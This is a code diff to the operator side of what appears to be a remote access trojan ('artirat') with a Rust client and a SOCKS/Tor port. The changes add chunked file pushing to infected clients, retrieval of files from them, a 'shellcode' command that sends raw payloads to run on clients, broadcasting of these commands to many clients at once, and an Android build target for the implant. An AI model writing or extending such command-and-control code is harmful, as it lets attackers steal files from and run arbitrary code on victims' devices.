@@ -19,7 +19,7 @@ SOCKS_PORT = 19050
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 PROJECT_DIR = os.path.dirname(BASE_DIR)
-CLIENT_CONFIG_DIR = os.path.join(PROJECT_DIR, "artirat-client", "config")
+CLIENT_CONFIG_DIR = os.path.join(".", "artirat-client", "config")
 SERVER_CONFIG_DIR = os.path.join(PROJECT_DIR, "artirat-server", "config")
 HOSTNAME_PATH = os.path.join(SERVER_CONFIG_DIR, "hostname")
 CLIENT_HOSTNAME_PATH = os.path.join(CLIENT_CONFIG_DIR, "hostname")
@@ -75,6 +75,45 @@ def recv_until_prompt(conn, prompt=b">> "):
     return data
 
 
+def send_chunked_file(conn, cmd_prefix, fname):
+    basename = os.path.basename(fname)
+    with open(fname, "rb") as f:
+        data = f.read()
+    b64 = base64.b64encode(data).decode()
+    conn.sendall(f"{cmd_prefix}-start {basename}\n".encode())
+    for i in range(0, len(b64), 16384):
+        chunk = b64[i:i+16384]
+        conn.sendall(f"{cmd_prefix}-chunk {chunk}\n".encode())
+    conn.sendall(f"{cmd_prefix}-end\n".encode())
+
+def parse_file_response(out):
+    lines = out.split("\n")
+    fname = None
+    accumulated = ""
+    in_file = False
+    for line in lines:
+        line = line.strip()
+        if line.startswith("[file-start] "):
+            fname = line[13:]
+            accumulated = ""
+            in_file = True
+        elif in_file and line.startswith("[file-chunk] "):
+            accumulated += line[13:]
+        elif in_file and line.startswith("[file-end] "):
+            in_file = False
+        elif line.startswith("[file] "):
+            rest = line[7:]
+            sp = rest.find(" ")
+            if sp > 0:
+                fname = rest[:sp]
+                accumulated = rest[sp + 1:]
+    if fname and accumulated:
+        try:
+            return fname, base64.b64decode(accumulated)
+        except Exception:
+            pass
+    return None, None
+
 def interactive_session(conn, addr):
     initial = recv_until_prompt(conn)
     if initial is None:
@@ -101,10 +140,20 @@ def interactive_session(conn, addr):
             if not os.path.exists(fname):
                 print(f"File not found: {fname}")
                 continue
+            send_chunked_file(conn, "download", fname)
+        elif line.startswith("shellcode "):
+            parts = line.split(" ", 1)
+            if len(parts) < 2:
+                print("Usage: shellcode <filepath>")
+                continue
+            fname = parts[1].strip()
+            if not os.path.exists(fname):
+                print(f"File not found: {fname}")
+                continue
             with open(fname, "rb") as f:
                 data = f.read()
             b64 = base64.b64encode(data).decode()
-            cmd = f"download {os.path.basename(fname)} {b64}\n"
+            cmd = f"shellcode {b64}\n"
             conn.sendall(cmd.encode())
         else:
             conn.sendall((line + "\n").encode())
@@ -112,21 +161,15 @@ def interactive_session(conn, addr):
         if response is None:
             return False
         out = response.decode(errors="ignore")
-        if out.startswith("[file] "):
-            rest = out.rstrip(">> ").strip()
-            if rest.startswith("[file] "):
-                rest2 = rest[7:]
-                sp = rest2.find(" ")
-                if sp > 0:
-                    fname = rest2[:sp]
-                    encoded = rest2[sp + 1:]
-                    try:
-                        fdata = base64.b64decode(encoded)
-                        with open(fname, "wb") as f:
-                            f.write(fdata)
-                        print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
-                    except Exception as e:
-                        print(f"Save error: {e}")
+        prompt = ">> "
+        if out.endswith(prompt):
+            out = out[:-len(prompt)]
+        out_clean = out.rstrip("\n")
+        fname, fdata = parse_file_response(out_clean)
+        if fname and fdata:
+            with open(fname, "wb") as f:
+                f.write(fdata)
+            print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
         print(out, end="", flush=True)
 
 
@@ -142,10 +185,24 @@ def multi_run(manager: ClientManager, cmdline: str, timeout=15):
         if not os.path.exists(fname):
             print(f"File not found: {fname}")
             return
+        basename = os.path.basename(fname)
         with open(fname, "rb") as f:
             data = f.read()
         b64 = base64.b64encode(data).decode()
-        cmdline = f"download {os.path.basename(fname)} {b64}"
+        chunks = [b64[i:i+16384] for i in range(0, len(b64), 16384)]
+        cmdline = f"download-start {basename}\n" + \
+                  "\n".join(f"download-chunk {c}" for c in chunks) + \
+                  f"\ndownload-end"
+    elif cmdline.startswith("shellcode "):
+        parts = cmdline.split(" ", 1)
+        fname = parts[1].strip()
+        if not os.path.exists(fname):
+            print(f"File not found: {fname}")
+            return
+        with open(fname, "rb") as f:
+            data = f.read()
+        b64 = base64.b64encode(data).decode()
+        cmdline = f"shellcode {b64}"
 
     print(f"[*] multi_run on {len(clients)} client(s): {cmdline}")
     results = {}
@@ -188,21 +245,15 @@ def multi_run(manager: ClientManager, cmdline: str, timeout=15):
         data = results[cid]
         print(f"\n--- Client {cid} ---")
         out = data.decode(errors="ignore") if isinstance(data, bytes) else str(data)
-        fi = out.rfind("[file] ")
-        if fi >= 0:
-            after = out[fi + 7:].rstrip(">> ").strip()
-            sp = after.find(" ")
-            if sp > 0:
-                fname = after[:sp]
-                encoded = after[sp + 1:]
-                try:
-                    fdata = base64.b64decode(encoded)
-                    save = f"multi_{cid}_{fname}"
-                    with open(save, "wb") as f:
-                        f.write(fdata)
-                    print(f"  [Saved: {save} ({len(fdata)} bytes)]")
-                except Exception:
-                    pass
+        prompt = ">> "
+        if out.endswith(prompt):
+            out = out[:-len(prompt)]
+        fname, fdata = parse_file_response(out)
+        if fname and fdata:
+            save = f"multi_{cid}_{fname}"
+            with open(save, "wb") as f:
+                f.write(fdata)
+            print(f"  [Saved: {save} ({len(fdata)} bytes)]")
         print(out, end="")
 
 
@@ -212,13 +263,17 @@ def build_client(target: str):
         "linux": "x86_64-unknown-linux-gnu",
         "linux-musl": "x86_64-unknown-linux-musl",
         "linux32": "i686-unknown-linux-gnu",
+        "android": "aarch64-linux-android",
     }
     t = targets.get(target, target)
     print(f"[*] Building for {t} (this may take a while)...")
+    env = os.environ.copy()
+    if target == "android" or t == "aarch64-linux-android":
+        env["CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER"] = "aarch64-linux-android21-clang"
     r = subprocess.run(
         ["cargo", "build", "--release", "--target", t],
         cwd=os.path.join(PROJECT_DIR, "artirat-client"),
-        capture_output=True, text=True
+        env=env, capture_output=True, text=True
     )
     if r.stdout:
         print(r.stdout)
